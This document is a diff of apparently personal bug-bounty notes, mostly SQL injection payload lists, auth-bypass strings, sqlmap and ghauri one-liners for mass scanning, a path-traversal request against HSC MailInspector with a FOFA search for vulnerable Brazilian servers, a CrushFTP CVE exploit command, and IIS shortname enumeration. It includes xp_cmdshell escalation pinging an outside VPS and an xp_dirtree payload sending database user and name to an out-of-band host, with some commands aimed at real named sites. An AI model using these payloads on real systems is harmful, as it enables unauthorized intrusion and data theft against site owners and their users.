+Many vulnerable brazilian servers 🇧🇷
+
+GET   /mailinspector/public/loader.php?path=../../../../../../../etc/passwd
+
+Query⚙️title=="..:: HSC MailInspector ::.."
+
+Link🔗https://en.fofa.info/result?qbase64=dGl0bGU9PSIuLjo6IEhTQyBNYWlsSW5zcGVjdG9yIDo6Li4i&page=1&page_size=10
+
+
+   CVE-2024-4040
+   https://github.com/rbih-boulanouar/CVE-2024-4040
+   A server side template injection vulnerability in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative access, and perform remote code execution on the server.
+
+python exploit.py -u https://example.com -p /etc/passwd
+
+
+
+CVE Discovery at Scale
+   github dorks for CVES
+   https://medium.com/@dub-flow/the-easiest-way-to-find-cves-at-the-moment-github-dorks-29d18b0c6900
+   
+   PHP XSS:
+          /\becho\b.*\$_GET\b/ or /echo\s+\$_REQUEST/
+PHP XSS: 
+          /^.*\becho\s+\$_GET\b.*$/
+PHP XSS (most FP-prone): 
+          /^.*\becho\s+\$\b.*$/
+PHP SQL Injection:
+                  /(SELECT|INSERT|UPDATE|DELETE)\s(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
+PHP OS Command Injection: 
+               /(exec\(|system\(|shell_exec\(|passthru\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
+Host Header Injection (Node.js & PHP): 
+             req.headers.host path:*pass* and /\$_SERVER\['host'\]|gethostname\(\).*(reset|forgot)/
+.NET Host Header Injection: 
+                     /(Request\.Headers\["Host"\]|Request\.Host\.Value|HttpContext\.Current\.Request\.Headers\["Host"\]|HttpContext\.Request\.Host\.Value)/ forgot
+Host Header Injection generic:
+                       host path:**/*forgot*/**
+Insecure Deserialization in PHP: 
+                    /(unserialize\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
+
+
+# #IIS-VUNERABILITY                              IIS-VUNERABILITY                               IIS-VUNERABILITY
+https://docs.google.com/presentation/d/1AA0gX2-SI_9ErTkBhtW0b-5BH70-1B1X/edit?pli=1#slide=id.p46 
+#nuclie-template
+ https://github.com/projectdiscovery/nuclei-templates/blob/d6636f9169920d3ccefc692bc1a6136e2deb9205/fuzzing/iis-shortname.yaml
+        
+# #Discovering
+#### Shodan 
+ http.title:"IIS"
+Company dork
+Ssl:"Bsides Ahmedabad Inc." http.title:"IIS"
+
+Host dork
+Ssl.cert.subject.CN:"bsidesahmedabad.in" http.title:"IIS"
+
+  Tools For Testing
+ 1) IIS Tilde Enumeration (Burp Extension)
+2) Shortscan tool Github
+   (to detect short names of files and directories)
+3) JetBrains dotPeek
+    (to analyze files such as dll file and export the source of that file)
+4) visual studio code 
+     [for read/review the code/source]
+
+###### #Testing
+Sortscan basic usage
+shortscan https://url/
+Burp Extension IIS Tilde Enumeration
+Copy the target url and scan 
+**NOTE** 
+any valid dir endpoint such as 403,401,301,200 etc… 
+scan that endpoint again , not just the url 
+
+  
+example
+$ shortscan https://bsidesahmedabad.in/
+$ shortscan https://bsidesahmedabad.in/admin/
+$ shortscan https://bsidesahmedabad.in/test/
+FFUF fuzzing
+$ ffuf -w iis.txt -u https://bsidesahmedabad.in/FUZZ
+$ ffuf -w iis.txt -u https://bsidesahmedabad.in/shortnameFUZZ
+Shortname-FUZZ / shortname_FUZZ
+
+
+Tips to complete the shortname and get a valid Dir/file
+https://IIS/
+ [+] Identified directories: 
+ 1
+ |_ DS_STO~1
+Identified files: 1
+|_ DESKTOP~1.ZIP
+
+###### #FFUF
+$ ffuf -w iis.txt -u https://IIS/ds_stoFUZZ
+$ ffuf -w iis.txt -u https://IIS/desktopFUZZ.zip
+$ ffuf -w iis.txt -u https://IIS/desktop-FUZZ.zip
+$ ffuf -w iis.txt -u https://IIS/desktop_FUZZ.zip
+$ ffuf -w iis.txt -u https://IIS/desktop%20FUZZ.zip
+
+2) Github dorking 
+     Path:/ds_sto
+3) Chat AI
+    GENERATE A long worldlist starting ds_sto
+
+4) Intruder (numbers 0-100000)/Etc….
 
     
  
  SQL INJECTION        SQL INJECTION          SQL INJECTION            ****check for cypher injection
+    
  
+
+ https://medium.com/@amitdutta6026/bypassing-cloudflares-sql-injection-filter-without-origin-ip-discovery-2bb8c97bc5db
+ https://medium.com/@daoud_youssef/from-host-header-injection-to-sql-injection-e7c61a61b575 
+ https://medium.com/@HX007/subdomain-fuzzing-worth-35k-bounty-daebcb56d9bc
+     https://pentestbook.six2dez.com/enumeration/web/sqli
+  https://hacktube5.online/sqlmap-tamper-scripts-to-bypass-waf/
+  https://medium.com/@bug4y0u/how-i-got-4-sqli-vulnerabilities-at-one-target-manually-using-the-repeater-tab-ed4eb1f84147 
+  https://github.com/malvads/sqlmc
+  https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+  https://portswigger.net/web-security/sql-injection/cheat-sheet
+  
+   
+   check this tool https://github.com/danialhalo/SqliSniper
+   
+   
+   
+   
+   tip on error base sqli
+
+remenmber that   developer block or filter ' "   # ; ?  these ..  check  error_base_payload   and see alot of payload to use..  if there is  any error try sqli with ghauri and sqlmap and manually in burp to confirm more..
+ 
+
+ 
+    ‘/*!Union/*AmitTheNoob*/*/ select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database().
+ 
+https://github.com/HernanRodriguez1/SQLi_Sleeps
+ https://www.codelivly.com/sql-injection-101-understanding-the-basics-of-sql-injection-attacks/
+
+#TIP 
+ payload 
+ admin’ or ‘1’=’1'#
+-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
+  
+  #TIP
+  # Time-Based Blind SQL Injection in Oracle
+  'and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,10)--   
+
+ #using-Ghuari-tool
+ ghauri -r a.txt - dbs - batch
+ ghauri -r a.txt - dbs -D xxxxxlive -T admin - columns
+ ghauri -r a.txt - dbs -D xxxxxlive -T admin - dump - batch
+
+
+  that's a fancy SQLi payload. Working against almost everything.
+/?query="OR 1=1;--"&val1=ZGlkbnQgZXZlbiByZWFk&val2=aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQ%3D%3D&SLEEP(420)
+          
+#tip
+try testing for SQLi Authentication Bypass 
+username:'--'/"--"
+password:'--'/"--"
+
+admin’ OR 1=1- -‘
+
+
+  #TIP 
+ If you come across a domain that uses Typo3 CMS, be sure to check its parameters. Old version Typo3 CMSs may still earn you rewards.
+Payload ;
+-1+OR+3 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW2 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW1=6 +AND+000762=000762
+
+#tip
+  *configure sqlmap to use this prefix and suffix:*
+    --prefix="' " --suffix=' -- a'
+      ...&param=r -p param --prefix="cana'||" --suffix="||'y.bluebird" --tamper space2comment --level=3 --risk=2 --string "select distinct object from ucon_p" --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B
+
+   #tip
+   The target has an admin login page where certain methods are allowed. I found the API endpoint for the admin login and sent the same payload. Success.  
+   
+POST /admin/login ==> 405 
+POST /api/v01/admin/login ==> 200 OK + Blind SQLi 
+
+   tip
+ check if you could test all the parameter with =  25%25
+
+#tip
+ escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
+     https://medium.com/@harrmahar/escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
+     website using  Microsoft SQL Server 
+     EXEC xp_cmdshell 'ping 165.1.2.123';                       vps 
+     
+  https://redacted.com/download/123/123 EXEC xp_cmdshell 'ping%20165.1.2.123';--       
+  https://redacted.com/download/123/123%20EXEC%20xp_cmdshell%20'ping%20165.1.2.123'%3b--         urldecoded
+  
+  tcpdump -i eth0 -icmp
+  
+  
+  #tip
+  If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file.
+  
+  #tip
+    Based on the information gathered from the Nuclei scan, which revealed that the application uses PHP running on Apache, I focused on sending MySQL Sleep payloads
+    
+#TIP
+    1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
+2. it will crawl all the links having input field
+3. select the parameter you want to test
  
  tip
  Always try the "\" character in login entries. It can trigger an SQL.
@@ -5125,17 +3983,116 @@ curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
  
  waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
  
-  allwos give a single quote on a paramater, this might resuilt to 500 server error
+ waybackurls http://testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
  
+ cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
+ 
+#tip
+SQL Injection in MS Access with backslash escaped 
+SELECT * FROM Users WHERE Username = 'a\' OR \'a\'=\'a' AND Password = 'a\' OR \'a\'=\'a'
+SELECT * FROM Users WHERE Username = 'a\' OR 5=10\'2' AND Password = 'a\' OR 5=10\'2
+
+#tip
+Sql injection 
+ https://hackerone.com/reports/531051 
+AlwaYS attempts to mount XXE (XML External Entity) attacks on the file upload form . AND CHECK If XML encoded single quote caused a database error, then try SQli injection 
+
+
+
+#tip
+Remember,  when ' is filtered out, then CHAR(27) is used  nd try also inserting it on every url parameter  and also try (‘ or 1=2 — )  incase there is firewall blocking  '  or 1=1 -- 
+' UNION SELECT CONCAT(name, " ",
+ssn) FROM ssn LIMIT 1 OFFSET 1-- -,
+
+Selecting only one table
+
+#tip
+Sleep payload when testing 
+
+' or sleep(15) and 1=1#
+' or sleep(15)#
+' union select sleep(15),null#
+
+#Tip  tip tip
+In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by   t inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. try the emoji in  ant  input field below give 😯. somtimes develper dont validate emoji
+
+UNION SELECT 1,2,username,password FROM users WHERE username='admin'
+ 
+ #tip
+ users=any@mail.com&pass=admin
+--> 1 sec
+
+user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+--> 30s
+
+user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(20)))a)XOR'Z
+--> 30s
+ 
+     TIP
+     Sometimes bypassing SQL can be a problem, you can try this way
+payload ;
+
+8%20or%207250%3d0725
+
+sqlmap ;
+sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
+
+        sqlmap -u "https://www.cadiak.com.la/reporttype.php?id=2" --batch -D cbl22 --tables --threads=5 --force-ssl
+   
+   
+   tip
+        Post sql) Put ' in search box it reflect sql error in response after that intercept request in burpsuite and in search param put * so sqlmap will automatic detect param endpoint to test  and copy all request and save it in file and use -r flag in sqlmap
+ 
+ 
+ 
+#tip 
  echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
-
 cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
-
 sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
-
 sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
 
+
+  #using-sqlmap
+  https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
+  --tamper
+  --tamper="random,appendnullbyte,between,base64encode"     //     This would instruct sqlmap to use all of the scripts separated by commas.
+  --tamper="between,randomcase"    
+    --list-tampers           list all the temper
+    
+    
+Level 2    look for  HTTP Cookie headers for SQL injection vulnerability
+sqlmap -u 'http://localhost:8440/" --level=2
+sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --param-exclude="PHPSESSID"
+sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --skip="cookies"
+sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." -p "id"
+
+
+
+
+
+   tip  
+   hunting in smart way
+   
+
+Step 1: I used google dork to fetch all the login pages → site:redacted.com inurl:login
+
+Step 2: Make a list of SQL payloads, hit on all the login pages with Intruder.
+
+Step 3: Check for SQL Query in error/response.
+
+Step 4: If you successfully get SQL error → Run SQL map
+
+Step 5: Get the big FAT Bounty !!!!
+
+
+
+
+   #ONE-LINER
    SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
+   
+   sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
+   
+   
 cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 
 subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
@@ -5145,8 +4102,24 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
   subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
   
   
-  Time based SQL injection
+ #tip
+  Do you know that sqlmap has its own crawler? Run in the background easily:
+sqlmap -u 'https://target\.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
+  
+  Found SQL Injection to Account Takeover Manually :) 
+1. Enter mobile number to login intercept
+{"mobile_number":"8888888888"} >> 200
+{"mobile_number":"8888888888'"} >> 500
+{"mobile_number":"8888888888''"} >> 200
+  
+  
+  #Time-based-SQL-injection
   cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+  
+  #tip
+  if The target is running the Postgres SQL server put the Unicode char  "\u0000"  and see the magic 😄
+note:  this can break the database
+  
   
   
    SQL ERROR
@@ -5160,7 +4133,7 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
 $sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337
 
 
-   tip   tip 
+   #tip
    stumbled on subdomain giving 403    example legacypanel.redacted.com
    added a path to it and watch the response 
    legacypanel.redacted.com/dummy, check the response to check if it gives 404
@@ -5170,44 +4143,46 @@ $sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as bei
    
   
    
-  
+#TIP 
 Found SQL Injection in [org_id] Cookie
 Payloads for Testing: 
 -1 OR 0=6 AND 0-0=> FALSE 
 -1 OR 6=6 AND 0-0=> TRUE
 
+#tip 
 Injected in request like this
 Cookie:organization_id=-1%20OR%200%3D6%20AND%200-0
 
-   UniBox   username field , you can place in any password
+  #UniBox   
+  username field , you can place in any password
    'or 1=1 limit 1-- -
 
 
-  
-   3 easy steps to get your first SQLi:
-
-1️⃣ Waybackurls: Gather all the possible url’s of a target.
-
-cat target.txt | waybackurls | tee urls.txt
-
-2️⃣ GF tool: Filter all the SQL parameters of a target and save it as any.txt.
-
-cat any.txt | gf sql > any.txt
+  TIP
+     **** #Tip  tip tip   in every comment 
+In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by    inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. 
 
 
-3️⃣ SQLmap: Send any.txt to SQLmap.
-
-python http://sqlmap.py -m any.txt  —risk 3 —batch
-
-💸 Alternatively use Gahuri to test the same
+  #tip
+  Sql injection tutorial on Addslashes
+http://leettime.net/sqlninja.com/tasks/mics_ch6.php?id=1%af%5c'Union(select(1),version(),3,4,5,6,7,8)%23 
    
+   #tip
+   Sending payload on burp within the URL/URI itself can also trigger SQL injection. So don't just focus on the parameters.
    
-  Nota and tip
+#tip
+  Note and tip
   SQLi Tip - If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file
- 
- 
-𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
+  
+#tip
+  SQLMap from Waybackurls
+waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
 
+
+ 
+ 
+---
+𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
 cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
  
  
@@ -5216,7 +4191,7 @@ cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))
 curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
   
   
-  tip
+  #tip
   python3 sqlmap.py -u https://www..gov./press-release-detail?id=6622 — batch — banner — dbs — dump-all technique=E — risk 3 — level 4 -v 3 — prefix="'(" — suffix="')" — flush-session — random-agent
   
   python3 sqlmap.py "https://www...x.x.x..com/en/login.php?destination=%2Forchis%2F6%3FPHPSESSID%3D&PHPSESSID=" — level=5 — risk=3 — banner — dump-all
@@ -5257,18 +4232,97 @@ curl -X POST 'http://localhost:8000/user' \
 curl -X POST 'http://localhost:8000/user' \
   -H 'Content-Type: application/json' \
   -d '{"name": "Bob", "age": 45, "email": ""}'
-   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION
-     Subfinder -d target.com | tee -a domain.txt
-     cat domain.txt | httpx | tee -a url.alive.txt
-     cat url.alive.txt | waybackurls | tee - a urls.check.txt
-     gf sqli urls.check >> urls.sqli.txt         //  gf url.check >> urls.sqli.txt
-     sqlmap -m urls.sqli.txt  --dbs --batch
+
+
+
+  #tip 
+    https://github.com/ferreiraklet/Jeeves
+      cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done
+
+
+   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION       
+                                                         
+   1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)
+  2. cat domains | httpx | tee -a alive
+  3. cat alive | waybackurls | tee -a urls
+  4. gf sqli urls >> sqli
+  5. sqlmap -m sqli --dbs --batch
+  6. use tamper scripts
+  
+  
+  tip 
+  https://x.com/vulncure/status/1734908685103575408?s=20
+     
+           #or
+         use this
+            3 easy steps to get your first SQLi:
+
+1️⃣ Waybackurls: Gather all the possible url’s of a target.
+
+cat target.txt | waybackurls | tee urls.txt
+
+2️⃣ GF tool: Filter all the SQL parameters of a target and save it as any.txt.
+
+cat any.txt | gf sql > any.txt
+
+
+3️⃣ SQLmap: Send any.txt to SQLmap.
+
+python http://sqlmap.py -m any.txt  —risk 3 —batch
+
+💸 Alternatively use Gahuri to test the same
+     
+          
+     
+#tip
+ boolean-based SQL injection payload
+      "XOR(if((select/**/666/**/where/**/1=1),444,0))XOR"       // This would result in a TRUE condition returning a response of ~21,000 bytes
+"XOR(if((select/**/666/**/where/**/1=2),444,0))XOR"             // This would result in a FALSE condition returning ~27,000 bytes
+
+
+
+
+#MORE-ABOUT-SQLMAP
+      https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
+      
+        MODIFYING HTTP HEADERS AND COOKIES
+        to modify the User-Agent header to "Mozilla/5.0" 
+        sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
+        
+         to modify the PHPSESSID cookie to "12345" 
+         sqlmap -u <target URL> --cookie="PHPSESSID=12345"
+     
+      TAMPERING WITH REQUEST PARAMETERS
+      --data: This option allows you to set or modify the data sent in the request body during the scan. You can use it to modify parameters such as username, password, id
+      to modify the id parameter to "1' OR 1=1#"
+      sqlmap -u <target URL> --data="id=1' OR 1=1#"
+       sqlmap -u <target URL> --data="id=%27+OR+1%3D1--"                     //      Bypassing input filters
+       
+     sqlmap -u <target URL> --data="id=1' AND SLEEP(5)--"      using timebase , If a database has a firewall in place that blocks certain SQL commands or queries
+     sqlmap -r request.txt --random-agent --dbs --proxy=http://127.0.0.1:8080 --force-ssl --batch --risk 3 --level 3
+      
+      --tamper       This option allows you to use custom tampering scripts to modify the data sent in the request body.
+      sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=apostrophemask.py
+        sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=tamper/space2hash.py                         //      Bypassing input filters     WITH TAMPER 
+        
+        Error-Based Sql Injection🤑️
+        sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
+      
+        
+        Blind SQL Injection
+       sqlmap -u "http://example.com/vulnerable.php" --data="username=admin&password=password" --technique B --string="Welcome, admin!" --not-string="Invalid login"
+                                  
+     
+    http://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html 
+    https://github.com/stephenbradshaw/pentesting_stuff/blob/master/helper_servers/sqlmap_secondorder_helper_server.py
+     NOTE
+  use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates
+  
+  Detection options
+     --string='Name\x0a\x09\x09Stephen'
      
      
-     
-     
-     
-    using GHARUI
+using GHARUI
     Basic Scan with Custom User-Agent and Cookie:
     ghauri -u https://www.site.com/vuln.php?id=1 --user-agent "mozilla/5.0" --cookie "PHPSSESSID=ABACE22333"
  
@@ -5286,13 +4340,16 @@ This command skips URL encoding of payload data while testing the 'id' parameter
     ghauri -u https://www.site.com/vuln.php?id=1 --threads 5
      Custom Detection Criteria with HTTP Code:
        ghauri -u https://www.site.com/vuln.php?id=1  --code 200 --string "welcome"
+       
+       
+    tip                              check more on this write up     https://infosecwriteups.com/i-earned-3500-and-40-points-for-a-graphql-blind-sql-injection-vulnerability-5b7e428c477d  
+    whenever you encounter internal server error while testing sql,  validate by sending by sending sql paylaod                        XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z                or 
+   payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515  and test sqli on every sql query and also check the bytes
  
+#tip  
+ payload 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
  
- 
- payload 
- 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
- 
- 
+ #TIP
  SQL injection Oneliner.
  subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
@@ -5302,11 +4359,9 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
     TIME-BASE SQL INJECTION
 gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
 
- SQL Injectjon for Contact/Registration Forms .
-1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
-2. it will crawl all the links having input field
-3. select the parameter you want to test
- 
+
+waybackurls http://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
+
  '"<svg/onload=prompt(5);>{{7*7}}
  
  
@@ -5317,7 +4372,25 @@ gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while r
 3. select the parameter you want to test
 
 
-  tips
+Exploitation of mssql injection
+By appending the value ‘“”) to the parameter, I triggered an error revealing that the table name was too long, indicating the presence of a SQL injection vulnerability. Further refining the injection payload, I successfully balanced the query to execute arbitrary commands. For instance:
+
+“https://evil.com/path/test.aspx?fuzz=1')--+-"
+“https://evil.com/path/test.aspx?fuzz=1') and 1=@@version — +-
+
+
+  
+#TIP
+Find SQLi using Jeeves
+echo "http://exampl.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10
+
+  #tip
+  If you find sql injection and encounter a 403 or waf block, be sure to try tamper scripts and update your sqlmap
+Payload ; 
+sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
+
+
+#tips
   Step 1: Go admin login page                        https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
 
 Step 2: Now enter the payload in the username or password field,
@@ -5328,17 +4401,148 @@ Step 3: Enter the payload and click the submit button.
 
 Step 4 : Booooom!!! You Login successfully…
 
-Thanks For Reading….!
+
+
+
+
+ TOP XOR BLIND PAYLOADS 
+
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
+
+0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+
+'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
+
+X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X
+
+X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
+
+X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
+
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+
+(SELECT(0)FROM(SELECT(SLEEP(6)))a)
+
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+
+'%2b(select*from(select(sleep(5)))a)%2b'
+
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
+
+');(SELECT 4564 FROM PG_SLEEP(5))--
+
+["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
+
+DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar
+
+AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar
+
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK
+
+(select*from(select(sleep(20)))a)
+
+'%2b(select*from(select(sleep(0)))a)%2b'
+
+*'XOR(if(2=2,sleep(10),0))OR'
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
+
+'+(select*from(select(if(1=1,sleep(20),false)))a)+'"
+
+2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)
+
+BENCHMARK(10000000,MD5(CHAR(116)))
+
+'%2bbenchmark(10000000%2csha1(1))%2b'
+
+'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true
+
+polyglots payloads:
+
+if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+
+if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/ 
+
+
+
+  subfinder -d target[.]com -all -silent | hakrawler | urldedupe |gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 1 --level 5 --random-agent | tee -a sqli.txt
   
+  payloads
+     admin';IF(97=97) WAITFOR DELAY '0:0:5' --820&TBPassword=
+     
+     admin'%3bIF(97=97)%20TAITFOR%20DELAY%20'0%3A0%3A5' --820&TBPassword=
+     
+admin';DECLARE @a varchar(1024);DECLARE @b varchar(1024);SELECT @a = (SELECT system_user);SELECT @b = (SELECT DB_NAME());EXEC('master..xp_dirtree "\\%c%' + @a + ' ' + '.' + '2svs73it2s6bhy1r9pghdhdhdh.oastify.com\test$"');--
 
 
+     
+
+  
+  
+  tip
+  always test sqli in parallel in any json object
+  
+  
+  tip
+  you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+
+These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+
+  NOTE
+   For a UNION query to work, two key requirements must be met:
+
+    The individual queries must return the same number of columns.
+    The data types in each column must be compatible between the individual queries.
+
+To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
+
+    How many columns are being returned from the original query.
+    Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
+    
+    Determining the number of columns required
+                 injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
+                 The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values: 
                  
                  
-                 CR/LF (Carriage Return/Line Feed) Injection       CR/LF (Carriage Return/Line Feed) Injection
+    NOTE 
